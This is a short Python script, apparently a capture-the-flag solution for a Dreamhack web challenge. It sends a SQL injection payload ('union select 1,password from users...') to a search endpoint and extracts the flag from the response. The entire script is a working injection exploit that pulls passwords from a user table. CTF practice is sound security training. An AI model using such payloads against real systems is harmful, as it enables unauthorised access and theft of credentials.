import requests
url = "http://host3.dreamhack.games:17160/search"

payload = "'union select 1,password from users where '1'='1"
res = requests.get(f"{url}?q={payload}")
print("D"+res.text.split("D")[-1].split("}")[0]+"}")